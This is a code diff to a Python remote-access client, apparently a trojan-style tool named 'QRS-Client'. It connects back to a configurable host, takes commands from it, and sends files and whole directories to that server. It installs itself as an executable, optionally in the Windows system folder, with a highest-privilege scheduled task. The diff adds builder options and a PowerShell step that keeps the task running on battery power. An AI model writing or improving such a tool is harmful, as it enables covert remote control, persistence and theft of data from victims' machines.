@@ -8,6 +8,7 @@ import string
 import json
 import ctypes
 import sys
+import argparse
 
 # ==== USER SETTINGS ====
 # IP and Port need to be directly updated in the following target code (under SERHER_HOST and SERVER_PORT)
@@ -18,6 +19,24 @@ HostIP = "127.0.0.1" # Enter the IP address of the host machine (leave empty to 
 HostPort = "5003" # Enter the port of the host machine (leave empty to use 5003)
 Saved = True # Set to True if you want to have a seperate save file
 # ========================
+
+if len(sys.argv) > 1:
+    parser = argparse.ArgumentParser(description="QRS-Client Configuration")
+    parser.add_argument('--oN', type=str, dest='output_name', help='Desired output name (without .exe)')
+    parser.add_argument('--oP', type=str, dest='output_path', help='Desired output folder (use / or \\). Use WIN for automatic Windows system folder.')
+    parser.add_argument('--tN', type=str, dest='task_name', help='Task name (optional, defaults to output-name)')
+    parser.add_argument('--hIP', type=str, dest='host_ip', help='Host IP address (leave empty to use localhost)')
+    parser.add_argument('--hP', type=str, dest='host_port', help='Host port (leave empty to use 5003)')
+
+    args = parser.parse_args()
+
+    if args.output_name: output_name = args.output_name
+    if args.output_path: output_path = args.output_path
+    if args.task_name: task_name = args.task_name
+    else: task_name = output_name
+    if args.host_ip: HostIP = args.host_ip
+    if args.host_port: HostPort = args.host_port
+print(f"[*] Using settings: {output_name}, {output_path}, {task_name}, {HostIP}, {HostPort}")
 
 # Save file
 if Saved:
@@ -246,23 +265,27 @@ def EstablishConnection():
             if command.lower() == "exit":
                 break
             if splited_command[0].lower() == "download":
-                if splited_command[1].lower() == "-r":
-                    try:
-                        DownloadDirectory(splited_command[2], splited_command[3], SERVER_HOST, 5005)
-                        output = f"Downloaded {splited_command[2]}"
-                    except Exception as e:
-                        output = f"An error occurred: {e}, Make sure you Started the Receiver Server and use the command correctly 'Download -r <directory> <max_depth>'"
+                if len(splited_command) < 2:
+                    output = "Please provide a file or directory to download."
                     found = True
                 else:
-                    try:
-                        DownloadFile(splited_command[1], SERVER_HOST, 5005)
-                        output = f"Downloaded {splited_command[1]}"
-                    except Exception as e:
-                        output = f"An error occurred: {e}, Have you started the Receiver Server? If not use 'StartFileServer' command to start the server."
-                    found = True
+                    if splited_command[1].lower() == "-r":
+                        try:
+                            DownloadDirectory(splited_command[2], splited_command[3], SERVER_HOST, 5005)
+                            output = f"Downloaded {splited_command[2]}"
+                        except Exception as e:
+                            output = f"An error occurred: {e}, Make sure you Started the Receiver Server and use the command correctly 'Download -r <directory> <max_depth>'"
+                        found = True
+                    else:
+                        try:
+                            DownloadFile(splited_command[1], SERVER_HOST, 5005)
+                            output = f"Downloaded {splited_command[1]}"
+                        except Exception as e:
+                            output = f"An error occurred: {e}, Have you started the Receiver Server? If not use 'StartFileServer' command to start the server."
+                        found = True
             if command.lower() == "start file server":
+                output = ""
                 found = True
-                continue
             if command.lower() == "ping":
                 output = "ACTIVE"
                 found = True
@@ -412,6 +435,14 @@ try:
         "/RL", "HIGHEST",  # Run with highest privileges
         "/TN", task_name if task_name else output_name,
         "/TR", f'"{full_output_exe}"'
+    ], check=True)
+
+    subprocess.run([
+        "powershell", "-Command",
+        f"""$task = Get-ScheduledTask -TaskName "{task_name if task_name else output_name}"; 
+        $task.Settings.DisallowStartIfOnBatteries = $false; 
+        $task.Settings.StopIfGoingOnBatteries = $false; 
+        Set-ScheduledTask -InputObject $task"""
     ], check=True)
     print(f"[✓] Scheduled task '{task_name if task_name else output_name}' created successfully.")
 except subprocess.CalledProcessError as e:
